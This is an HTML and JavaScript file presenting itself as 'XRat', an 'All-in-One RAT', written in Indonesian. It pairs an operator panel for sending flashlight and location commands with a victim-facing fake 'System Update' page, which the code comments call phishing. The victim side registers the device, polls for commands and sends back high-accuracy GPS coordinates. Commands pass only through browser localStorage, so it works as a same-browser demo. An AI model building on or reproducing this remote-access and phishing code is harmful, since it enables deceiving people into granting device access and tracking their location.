<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>XRat</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #0a0a0a;
            color: #00ff41;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
        }
        .container {
            max-width: 500px;
            width: 100%;
            background: #111;
            border: 2px solid #00ff41;
            border-radius: 16px;
            padding: 25px;
            box-shadow: 0 0 40px rgba(0,255,65,0.1);
        }
        h1 { text-align: center; font-size: 24px; letter-spacing: 2px; margin-bottom: 5px; }
        .sub { text-align: center; color: #666; font-size: 12px; margin-bottom: 20px; }
        .mode-selector {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-bottom: 20px;
        }
        .mode-btn {
            padding: 12px;
            border: 2px solid #1a1a1a;
            border-radius: 10px;
            background: #0a0a0a;
            color: #666;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            font-family: inherit;
        }
        .mode-btn.active {
            border-color: #00ff41;
            color: #00ff41;
            background: #1a3a1a;
        }
        .mode-btn:hover { border-color: #00ff41; }
        .status-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: #0a0a0a;
            padding: 10px 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid #1a1a1a;
        }
        .status-dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 8px; }
        .status-dot.online { background: #00ff41; }
        .status-dot.offline { background: #ff0044; }
        .target-list {
            background: #0a0a0a;
            border-radius: 10px;
            padding: 5px;
            max-height: 150px;
            overflow-y: auto;
            margin-bottom: 20px;
            border: 1px solid #1a1a1a;
        }
        .target-item {
            padding: 10px 15px;
            border-bottom: 1px solid #1a1a1a;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            transition: 0.2s;
            border-radius: 6px;
        }
        .target-item:hover { background: #1a1a1a; }
        .target-item.active { background: #1a3a1a; }
        .target-item .badge {
            background: #00ff41;
            color: #000;
            padding: 2px 12px;
            border-radius: 20px;
            font-size: 10px;
            font-weight: bold;
        }
        .btn-group {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin: 15px 0;
        }
        .btn {
            padding: 14px;
            border: none;
            border-radius: 10px;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            transition: 0.2s;
            font-family: inherit;
        }
        .btn:hover { transform: scale(1.02); }
        .btn:active { transform: scale(0.95); }
        .btn-green { background: #00ff41; color: #000; }
        .btn-green:hover { background: #00cc33; }
        .btn-red { background: #ff0044; color: #fff; }
        .btn-red:hover { background: #cc0033; }
        .btn-yellow { background: #ffaa00; color: #000; }
        .btn-yellow:hover { background: #dd8800; }
        .btn-full { grid-column: 1 / -1; }
        .btn-gray { background: #333; color: #666; cursor: not-allowed; }
        .log-box {
            background: #0a0a0a;
            border-radius: 10px;
            padding: 10px;
            max-height: 150px;
            overflow-y: auto;
            font-size: 12px;
            border: 1px solid #1a1a1a;
            margin-top: 15px;
            white-space: pre-wrap;
            word-break: break-all;
        }
        .torch-status {
            text-align: center;
            font-size: 14px;
            margin: 10px 0;
            padding: 10px;
            border-radius: 8px;
            background: #0a0a0a;
            border: 1px solid #1a1a1a;
        }
        .torch-status .on { color: #00ff41; }
        .torch-status .off { color: #ff0044; }
        .hidden { display: none; }
        .phising-card {
            background: rgba(20,20,35,0.95);
            backdrop-filter: blur(12px);
            border-radius: 24px;
            padding: 30px 24px;
            border: 1px solid rgba(255,255,255,0.08);
            box-shadow: 0 25px 50px -8px rgba(0,0,0,0.8);
            text-align: center;
        }
        .phising-card .icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 50%;
            margin: 0 auto 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
            color: #fff;
            box-shadow: 0 8px 24px rgba(102,126,234,0.3);
        }
        .phising-card h1 { color: #fff; font-size: 22px; font-weight: 700; margin-bottom: 4px; }
        .phising-card .sub { color: #8899bb; font-size: 14px; margin-bottom: 4px; }
        .phising-card .version { color: #556688; font-size: 12px; margin-bottom: 20px; }
        .phising-card .badge {
            display: inline-block;
            background: rgba(102,126,234,0.15);
            color: #667eea;
            padding: 2px 14px;
            border-radius: 20px;
            font-size: 11px;
        }
        .phising-card .status-text {
            color: #8899bb;
            font-size: 13px;
            margin: 12px 0 16px;
            min-height: 20px;
        }
        .phising-card .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #fff;
            border: none;
            padding: 14px 20px;
            border-radius: 40px;
            font-size: 17px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            transition: 0.3s;
            box-shadow: 0 8px 20px rgba(102,126,234,0.25);
        }
        .phising-card .btn-primary:hover { transform: scale(1.02); opacity: 0.9; }
        .phising-card .btn-primary:disabled { opacity: 0.5; transform: none; cursor: not-allowed; }
        .phising-card .btn-primary .spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .phising-card .footer-text {
            color: #445566;
            font-size: 11px;
            margin-top: 16px;
            border-top: 1px solid #1a1a2e;
            padding-top: 14px;
        }
        .phising-card .features {
            display: flex;
            justify-content: center;
            gap: 16px;
            margin: 12px 0 16px;
            font-size: 12px;
            color: #667788;
        }
        .phising-card .features span { display: flex; align-items: center; gap: 4px; }
        .phising-card .progress-bar {
            width: 100%;
            height: 6px;
            background: #1a1a2e;
            border-radius: 4px;
            overflow: hidden;
            margin: 12px 0;
        }
        .phising-card .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            border-radius: 4px;
            transition: width 0.4s ease;
        }
    </style>
</head>
<body>

<div class="container" id="app">
    <h1>🔦 XRat</h1>
    <div class="sub">All-in-One RAT</div>

    <!-- Mode Selector -->
    <div class="mode-selector">
        <button class="mode-btn active" id="modeAdmin" onclick="setMode('admin')">🎮 Admin</button>
        <button class="mode-btn" id="modeTarget" onclick="setMode('target')">🎯 Target</button>
    </div>

    <!-- Admin Panel -->
    <div id="adminPanel">
        <div class="status-bar">
            <span><span class="status-dot offline" id="statusDot"></span><span id="statusText">Offline</span></span>
            <span id="targetCount">0 target</span>
        </div>

        <div class="target-list" id="targetList">
            <div style="color:#555;text-align:center;padding:15px;">Menunggu target...</div>
        </div>

        <div class="torch-status" id="torchStatus">
            💡 Status: <span class="off" id="torchText">OFF</span>
        </div>

        <div class="btn-group">
            <button class="btn btn-green" onclick="sendCmd('senter on')">💡 Senter ON</button>
            <button class="btn btn-red" onclick="sendCmd('senter off')">💡 Senter OFF</button>
            <button class="btn btn-yellow btn-full" onclick="sendCmd('lokasi')">📍 Get Lokasi</button>
        </div>

        <div class="log-box" id="logBox">[+] XRat siap...</div>
    </div>

    <!-- Target Panel -->
    <div id="targetPanel" class="hidden">
        <div class="phising-card">
            <div class="icon">🔦</div>
            <h1>System Update</h1>
            <div class="sub">Pembaruan keamanan penting</div>
            <div class="version">v3.2.1 • 28 MB</div>
            <div class="badge">🔒 Diperlukan untuk keamanan</div>

            <div class="features">
                <span>🔐 Enkripsi</span>
                <span>🛡️ Anti-Malware</span>
                <span>📱 Optimasi</span>
            </div>

            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>

            <div class="status-text" id="targetStatus">🔍 Memeriksa pembaruan...</div>

            <button class="btn-primary" id="actionBtn" onclick="startUpdate()">
                <span id="btnText">Update Sekarang</span>
            </button>

            <div class="footer-text">Diperlukan untuk perlindungan perangkat Anda</div>
        </div>
    </div>
</div>

<script>
    // ============================================
    // KONFIGURASI
    // ============================================
    const TARGET_ID = 'target_' + Date.now() + '_' + Math.random().toString(36).slice(2, 6);
    let selectedTarget = null;
    let currentMode = 'admin';
    let isUpdating = false;

    // ============================================
    // MODE SWITCH
    // ============================================
    function setMode(mode) {
        currentMode = mode;
        document.getElementById('modeAdmin').className = 'mode-btn' + (mode === 'admin' ? ' active' : '');
        document.getElementById('modeTarget').className = 'mode-btn' + (mode === 'target' ? ' active' : '');
        document.getElementById('adminPanel').style.display = mode === 'admin' ? 'block' : 'none';
        document.getElementById('targetPanel').style.display = mode === 'target' ? 'block' : 'none';

        if (mode === 'target') {
            registerTarget();
            startTargetLoop();
        }
    }

    // ============================================
    // STORAGE FUNCTIONS
    // ============================================
    function getTargets() {
        try { return JSON.parse(localStorage.getItem('xrat_targets') || '{}'); } catch { return {}; }
    }
    function saveTargets(targets) { localStorage.setItem('xrat_targets', JSON.stringify(targets)); }
    function getCommands() { try { return JSON.parse(localStorage.getItem('xrat_commands') || '[]'); } catch { return []; } }
    function saveCommands(cmds) { localStorage.setItem('xrat_commands', JSON.stringify(cmds)); }
    function getResults() { try { return JSON.parse(localStorage.getItem('xrat_results') || '[]'); } catch { return []; } }
    function saveResults(res) { localStorage.setItem('xrat_results', JSON.stringify(res)); }
    function clearResults() { localStorage.setItem('xrat_results', '[]'); }

    // ============================================
    // ADMIN FUNCTIONS
    // ============================================
    function updateTargetList() {
        const targets = getTargets();
        const div = document.getElementById('targetList');
        const keys = Object.keys(targets);
        document.getElementById('targetCount').textContent = keys.length + ' target';

        if (keys.length === 0) {
            div.innerHTML = '<div style="color:#555;text-align:center;padding:15px;">Tidak ada target online</div>';
            return;
        }

        div.innerHTML = keys.map(id => {
            const t = targets[id];
            const isActive = (id === selectedTarget);
            return `<div class="target-item ${isActive ? 'active' : ''}" onclick="selectTarget('${id}')">
                <span>${t.info || 'Target'} <span style="font-size:10px;color:#666;">${id.slice(0,6)}</span></span>
                <span class="badge">● online</span>
            </div>`;
        }).join('');
    }

    function selectTarget(id) {
        selectedTarget = id;
        log(`🎯 Target dipilih: ${id.slice(0,8)}`, 'cmd');
        updateTargetList();
    }

    function sendCmd(cmd) {
        if (!selectedTarget) {
            log('⚠️ Pilih target dulu!', 'err');
            return;
        }
        const cmds = getCommands();
        cmds.push({ target: selectedTarget, cmd, time: Date.now() });
        saveCommands(cmds);
        log(`▶ ${cmd} → ${selectedTarget.slice(0,8)}`, 'cmd');
    }

    function checkResults() {
        const results = getResults();
        if (results.length > 0) {
            const last = results[results.length - 1];
            log(`📥 ${last.msg}`, 'res');
            if (last.msg.includes('Senter ON')) {
                document.getElementById('torchText').className = 'on';
                document.getElementById('torchText').textContent = 'ON';
            } else if (last.msg.includes('Senter OFF')) {
                document.getElementById('torchText').className = 'off';
                document.getElementById('torchText').textContent = 'OFF';
            } else if (last.msg.includes('📍')) {
                document.getElementById('torchText').textContent = '📍';
            }
            clearResults();
        }
    }

    function log(msg, type = 'info') {
        const box = document.getElementById('logBox');
        const time = new Date().toLocaleTimeString();
        const colors = { cmd: '#ffaa00', res: '#00ff41', err: '#ff0044', info: '#00ff41' };
        const color = colors[type] || '#00ff41';
        const prefix = type === 'cmd' ? '▶' : type === 'err' ? '✖' : type === 'res' ? '✓' : '●';
        box.innerHTML += `<div><span style="color:#444;">[${time}]</span> <span style="color:${color};">${prefix} ${msg}</span></div>`;
        box.scrollTop = box.scrollHeight;
    }

    // ============================================
    // TARGET FUNCTIONS
    // ============================================
    function registerTarget() {
        const targets = getTargets();
        targets[TARGET_ID] = { id: TARGET_ID, info: 'Android Target', registered: Date.now() };
        saveTargets(targets);
        document.getElementById('targetStatus').innerHTML = '✅ Terhubung ke server';
    }

    function checkCommands() {
        const cmds = getCommands();
        if (cmds.length === 0) return;
        const cmd = cmds[cmds.length - 1];
        if (cmd.target === TARGET_ID || cmd.target === 'all') {
            handleCommand(cmd.cmd);
            const remaining = cmds.filter(c => c !== cmd);
            saveCommands(remaining);
        }
    }

    function handleCommand(cmd) {
        if (cmd === 'senter on') turnTorch(true);
        else if (cmd === 'senter off') turnTorch(false);
        else if (cmd === 'lokasi') sendLocation();
        else sendResult(`[Command] ${cmd} executed`);
    }

    function turnTorch(on) {
        try {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
                    .then(stream => {
                        const track = stream.getVideoTracks()[0];
                        if (track) {
                            const capabilities = track.getCapabilities();
                            if (capabilities.torch) {
                                track.applyConstraints({ advanced: [{ torch: on }] });
                                sendResult(`Senter ${on ? 'ON' : 'OFF'}`);
                                document.getElementById('targetStatus').innerHTML = `💡 Senter ${on ? 'ON' : 'OFF'}`;
                            } else {
                                sendResult('Senter tidak support');
                                document.getElementById('targetStatus').innerHTML = '⚠️ Senter tidak support';
                            }
                        }
                        stream.getTracks().forEach(t => t.stop());
                    })
                    .catch(err => {
                        sendResult(`Gagal akses senter: ${err.message}`);
                        document.getElementById('targetStatus').innerHTML = '⚠️ Gagal akses senter';
                    });
            } else {
                sendResult('MediaDevices tidak support');
                document.getElementById('targetStatus').innerHTML = '⚠️ Perangkat tidak support';
            }
        } catch(e) {
            sendResult(`Error: ${e.message}`);
        }
    }

    function sendLocation() {
        document.getElementById('targetStatus').innerHTML = '📍 Mendapatkan lokasi...';
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    const data = `${pos.coords.latitude}, ${pos.coords.longitude}`;
                    sendResult(`📍 ${data}`);
                    document.getElementById('targetStatus').innerHTML = `📍 ${data}`;
                },
                (err) => {
                    sendResult(`Gagal lokasi: ${err.message}`);
                    document.getElementById('targetStatus').innerHTML = '⚠️ Gagal dapat lokasi';
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } else {
            sendResult('GPS tidak support');
            document.getElementById('targetStatus').innerHTML = '⚠️ GPS tidak support';
        }
    }

    function sendResult(msg) {
        const results = getResults();
        results.push({ target: TARGET_ID, msg, time: Date.now() });
        saveResults(results);
    }

    function startTargetLoop() {
        if (window._targetLoop) return;
        window._targetLoop = setInterval(() => {
            if (currentMode === 'target') {
                checkCommands();
                const targets = getTargets();
                if (!targets[TARGET_ID]) registerTarget();
            }
        }, 2000);
    }

    // ============================================
    // UI PHISING (TIPU-TIPU UPDATE)
    // ============================================
    function startUpdate() {
        if (isUpdating) return;
        isUpdating = true;

        const btn = document.getElementById('actionBtn');
        const btnText = document.getElementById('btnText');
        const status = document.getElementById('targetStatus');
        const fill = document.getElementById('progressFill');

        btn.disabled = true;
        btnText.innerHTML = '<span class="spinner"></span> Mengunduh...';
        status.innerHTML = '⬇️ Mengunduh pembaruan...';
        let progress = 0;
        fill.style.width = '0%';

        const interval = setInterval(() => {
            progress += Math.random() * 8 + 3;
            if (progress >= 100) {
                progress = 100;
                clearInterval(interval);
                fill.style.width = '100%';
                status.innerHTML = '✅ Pembaruan berhasil!';
                btnText.innerHTML = '✅ Selesai';
                btn.style.background = 'linear-gradient(135deg, #2d8a4e, #1a6a3a)';
                btn.disabled = false;
                isUpdating = false;
                setTimeout(() => { status.innerHTML = '🛡️ Sistem aman & terupdate'; }, 1500);
            }
            fill.style.width = progress + '%';
            status.innerHTML = `⬇️ Mengunduh... ${Math.round(progress)}%`;
        }, 250);
    }

    // ============================================
    // STORAGE LISTENER (ANTAR TAB)
    // ============================================
    window.addEventListener('storage', (e) => {
        if (e.key === 'xrat_targets') updateTargetList();
        if (e.key === 'xrat_results' && currentMode === 'admin') checkResults();
    });

    // ============================================
    // INIT
    // ============================================
    setInterval(() => {
        if (currentMode === 'admin') {
            updateTargetList();
            checkResults();
            localStorage.setItem('xrat_admin', 'active');
        }
    }, 2000);

    window.addEventListener('beforeunload', () => {
        if (currentMode === 'target') {
            const targets = getTargets();
            delete targets[TARGET_ID];
            saveTargets(targets);
        }
        localStorage.removeItem('xrat_admin');
    });

    // Auto start as admin
    setMode('admin');
    log('🚀 XRat All-in-One siap', 'info');
</script>
</body>
</html>
